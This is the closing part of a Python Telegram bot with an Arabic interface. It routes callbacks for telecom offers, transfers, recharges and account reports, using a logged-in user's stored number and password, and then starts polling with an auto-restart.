                        bot.edit_message_text(final_text, user_id, call.message.message_id)
                    except:
                        bot.send_message(user_id, final_text)
                    clear_user_state(user_id)
                
                Thread(target=run_discount).start()
        
        elif action.startswith("prev_"):
            try:
                new_index = int(action.replace("prev_", ""))
                run_show_offer(user_id, new_index, call.message.message_id)
            except:
                pass
        elif action.startswith("next_"):
            try:
                new_index = int(action.replace("next_", ""))
                run_show_offer(user_id, new_index, call.message.message_id)
            except:
                pass
        elif action.startswith("subscribe_"):
            try:
                offer_index = int(action.replace("subscribe_", ""))
                run_subscribe_offer(user_id, offer_index, call.message.message_id)
            except:
                pass
        elif action.startswith("change_filter_"):
            filter_type = action.replace("change_filter_", "")
            state = get_user_state(user_id)
            if state and 'offers' in state.get('data', {}):
                state['data']['filter_type'] = filter_type
                save_user_state(user_id, step=state['step'], action=state['action'], data=state['data'])
                run_offers_refresh_flow(user_id, call.message.message_id)
        elif action == "refresh":
            run_offers_refresh_flow(user_id, call.message.message_id)
        elif action.startswith("back_to_offer_"):
            try:
                offer_index = int(action.replace("back_to_offer_", ""))
                run_show_offer(user_id, offer_index, call.message.message_id)
            except:
                pass
        
        elif action == "flex_transfer_menu":
            run_flex_transfer_menu(user_id, call.message.message_id)
        
        elif action == "charge_self":
            session = get_user_session(user_id)
            if not session:
                bot.answer_callback_query(call.id, "❌ يجب تسجيل الدخول أولاً!", show_alert=True)
                return
            run_charge_self(user_id, call.message.message_id)
        elif action == "charge_other":
            run_charge_other(user_id, call.message.message_id)
        
        else:
            pass
            
    except Exception as e:
        try:
            bot.send_message(user_id, f"❌ حدث خطأ: {str(e)}")
        except:
            pass

def run_package_report_callback(user_id, message_id, session):
    try:
        result, package_info = get_complete_package_report(session['number'], session['password'])
        try:
            bot.edit_message_text(result, user_id, message_id)
        except telebot.apihelper.ApiTelegramException as e:
            if "message is not modified" not in str(e):
                bot.send_message(user_id, result)
    except Exception as e:
        try:
            bot.edit_message_text(f"❌ خطأ: {str(e)}", user_id, message_id)
        except:
            bot.send_message(user_id, f"❌ خطأ: {str(e)}")

def run_owner_number_callback(user_id, message_id, session):
    try:
        result = get_owner_number_from_family_new(session['number'], session['password'])
        try:
            bot.edit_message_text(result, user_id, message_id)
        except telebot.apihelper.ApiTelegramException as e:
            if "message is not modified" not in str(e):
                bot.send_message(user_id, result)
    except Exception as e:
        try:
            bot.edit_message_text(f"❌ خطأ: {str(e)}", user_id, message_id)
        except:
            bot.send_message(user_id, f"❌ خطأ: {str(e)}")

def handle_exit():
    logger.info("🛑 جاري حفظ حالة البوت قبل الخروج...")
    try:
        logger.info("✅ تم حفظ الحالة بنجاح")
    except Exception as e:
        logger.error(f"❌ خطأ في حفظ الحالة: {e}")

atexit.register(handle_exit)

if __name__ == '__main__':
    init_database()
    init_channel_tables()
    init_default_channels()
    start_background_tasks()
    
    print(colored(pyfiglet.figlet_format("@Nagy918", font="big"), 'cyan'))  # تم تغيير JOKR NET إلى @Nagy918
    print("="*50)
    print(f"{SUCCESS_COLOR}🚀 البوت قيد التشغيل...{RESET}")
    print(f"{SUCCESS_COLOR}👑 قائمة الأدمن: {ADMIN_IDS}{RESET}")
    print(f"{SUCCESS_COLOR}🔄 تم تحديث الخدمات وإصلاح الأخطاء المطلوبة{RESET}")
    
    try:
        bot.infinity_polling()
    except KeyboardInterrupt:
        print(f"\n{SUCCESS_COLOR}🛑 تم إيقاف البوت بواسطة المستخدم.{RESET}")
    except Exception as e:
        print(f"{ERROR_COLOR}❌ خطأ غير متوقع: {e}{RESET}")
        if RESTART_ENABLED:
            print(f"{BRIGHT_YELLOW}🔄 جاري إعادة التشغيل بسبب خطأ...{RESET}")
            time.sleep(5)
            os.execv(sys.executable, ['python'] + sys.argv)